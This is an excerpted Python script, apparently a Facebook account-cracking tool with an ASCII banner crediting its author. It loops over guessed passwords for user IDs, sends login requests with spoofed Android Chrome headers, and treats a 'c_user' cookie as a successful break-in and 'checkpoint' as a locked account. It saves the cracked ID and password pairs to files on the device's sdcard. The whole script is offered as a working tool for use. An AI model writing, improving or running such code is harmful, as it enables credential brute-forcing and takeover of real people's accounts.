...
\x1b[1;92m   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝
 ...
 ┌───────────────────────────────────────┐
 │ [📶] CODED BY : AHMED YEASIN          │
 │ [📶] GITHUB   : LODING....            │
 │ [📶] WHATSAPP : +88017******          │
 │ [📶] VERSION  : 2.0                   │
 │ [📶] FACEBOOK  : \033[1;32mAHMED YEASIN\033[1;37m         │
 └───────────────────────────────────────┘""")
ok = []
cp = []
id = []
...
def Main():
	...
	love = input('[🍁] SELECT : ')
	print('[🌺] EXAMPLE : [1000,5000,10000,20000] ')
...
def test(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mAHMED\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="115.0.5835.203", "Google Chrome";v="115.0.5835.203"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"itel L6006"',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; BAH3-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5835.203 Mobile Safari/537.36',
    'viewport-width': '980',
}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/AHMED-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                
                print(f"\033[38;5;46m ┏━[SORRY FOR CP ID💔] ")
                print(f"\033[38;5;46m ┣━[Number] : {uid} ")
                print(f"\033[38;5;46m ┗━[Password] : {ps} ")
                open('/sdcard/AHMED.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
